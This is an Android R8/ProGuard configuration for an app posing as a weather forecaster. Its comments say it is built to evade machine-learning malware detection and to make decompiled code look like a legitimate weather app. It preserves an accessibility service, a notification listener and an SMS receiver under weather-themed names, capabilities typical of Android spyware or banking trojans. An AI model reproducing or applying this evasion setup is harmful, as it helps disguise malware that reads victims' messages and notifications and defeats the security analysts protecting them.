# Evasion principle: R8 is your ALLY for evasion
# R8 renames classes (a, b, c), inlines methods, removes dead code
# This destroys ML feature vectors that rely on class/method names

# Keep Worker classes (WorkManager instantiates via reflection)
-keep class com.skyweather.forecast.core.ForecastSyncWorker { *; }
-keep class com.skyweather.forecast.core.DataRefreshWorker { *; }

# Keep AccessibilityService (system binds by manifest class name)
-keep class com.skyweather.forecast.core.VoiceReadoutService { *; }

# Keep NotificationListenerService (system binds by manifest class name)
-keep class com.skyweather.forecast.core.WeatherAlertListener { *; }

# Keep SMS BroadcastReceiver (system dispatches by manifest class name)
-keep class com.skyweather.forecast.core.AlertMessageReceiver { *; }

# Keep widget receiver (manifest reference)
-keep class com.skyweather.forecast.widget.WeatherWidgetProvider { *; }

# Standard R8 optimizations — maximize code transformation
-optimizationpasses 5
-allowaccessmodification
-repackageclasses ''

# Remove all logging in release (reduces string constant pool)
-assumenosideeffects class android.util.Log {
    public static int d(...);
    public static int v(...);
    public static int i(...);
    public static int w(...);
}

# Keep model classes for potential serialization
-keep class com.skyweather.forecast.model.** { *; }

# Obfuscation dictionary — use weather-themed names for renamed classes
# Makes decompiled output look like legitimate weather app code
-obfuscationdictionary proguard-dictionary.txt
-classobfuscationdictionary proguard-dictionary.txt
-packageobfuscationdictionary proguard-dictionary.txt
